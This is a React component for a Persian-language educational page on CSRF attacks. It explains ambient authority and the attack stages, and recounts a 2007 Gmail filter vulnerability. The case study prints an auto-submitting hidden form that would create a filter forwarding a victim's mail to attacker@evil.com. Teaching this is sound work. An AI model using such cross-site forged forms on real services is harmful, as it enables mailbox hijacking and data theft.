
import React from 'react';
import { ShieldAlert, MousePointer2, UserCheck, Layers } from 'lucide-react';

const ProblemSection: React.FC = () => {
  return (
    <div className="space-y-12 animate-in slide-in-from-left duration-500">
      <div className="prose prose-invert max-w-none">
        <h3 className="text-2xl font-bold mb-2">کالبدشکافی تهدید: CSRF</h3>
        <p className="text-slate-400 text-sm italic mb-6">سوء استفاده از "مرجعیت محیطی" (Ambient Authority) در پروتکل HTTP</p>
        
        <p className="text-slate-300 leading-relaxed">
          مشکل ریشه‌ای در CSRF این است که مرورگرها به طور خودکار اعتبارنامه‌ها (کوکی‌ها، گواهی‌های کلاینت و غیره) را همراه با هر درخواست به سایت هدف ارسال می‌کنند، بدون اینکه بررسی کنند آیا این درخواست با نیت آگاهانه کاربر صادر شده است یا خیر.
        </p>
      </div>

      <div className="grid md:grid-cols-2 lg:grid-cols-4 gap-4">
        {[
          { icon: MousePointer2, title: "فریب کاربر", desc: "کشاندن قربانی به یک سایت مخرب تحت کنترل مهاجم.", color: "red" },
          { icon: Layers, title: "تزریق درخواست", desc: "ایجاد درخواست‌های پنهان (Hidden Forms/XHR) در پس‌زمینه.", color: "orange" },
          { icon: UserCheck, title: "تایید خودکار", desc: "ارسال خودکار کوکی‌های احراز هویت توسط مرورگر.", color: "blue" },
          { icon: ShieldAlert, title: "تغییر وضعیت", desc: "اجرای عملیات حساس (تغییر رمز، انتقال وجه) در سمت سرور.", color: "purple" }
        ].map((item, i) => (
          <div key={i} className="p-6 bg-slate-900 border border-slate-800 rounded-2xl hover:border-slate-600 transition-all">
            <item.icon className={`text-${item.color}-500 mb-4`} size={32} />
            <h4 className="font-bold text-sm mb-2">{item.title}</h4>
            <p className="text-[11px] text-slate-500 leading-normal">{item.desc}</p>
          </div>
        ))}
      </div>

      <div className="bg-slate-900 border border-slate-800 p-8 rounded-2xl relative overflow-hidden">
        <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-red-500 via-orange-500 to-red-500"></div>
        <h4 className="text-xl font-bold mb-4 flex items-center gap-3">
          تحلیل موردی: حمله به سرویس Gmail
        </h4>
        <p className="text-sm text-slate-400 mb-6 leading-relaxed">
          در سال ۲۰۰۷، مشخص شد که Gmail نسبت به CSRF در بخش تنظیمات فیلترها آسیب‌پذیر است. مهاجم می‌توانست با استفاده از یک تگ ساده <code>&lt;form&gt;</code>، تمام ترافیک ورودی کاربر را به یک آدرس ایمیل ثالث منحرف کند.
        </p>
        <div className="bg-black/60 p-6 rounded-xl font-mono text-xs border border-slate-700/50">
          <div className="text-slate-500 mb-2">// Malicious payload embedded in attacker.com</div>
          <div className="text-green-400">
            &lt;form action="https://mail.google.com/mail/f/settings" method="POST"&gt;<br/>
            &nbsp;&nbsp;&lt;input type="hidden" name="cf2_em" value="attacker@evil.com" /&gt;<br/>
            &nbsp;&nbsp;&lt;input type="hidden" name="action" value="create_filter" /&gt;<br/>
            &lt;/form&gt;<br/>
            &lt;script&gt; document.forms[0].submit(); &lt;/script&gt;
          </div>
        </div>
        <p className="mt-4 text-[11px] text-red-400 font-bold uppercase tracking-wider text-left">
          CRITICAL: No user interaction required
        </p>
      </div>
    </div>
  );
};

export default ProblemSection;
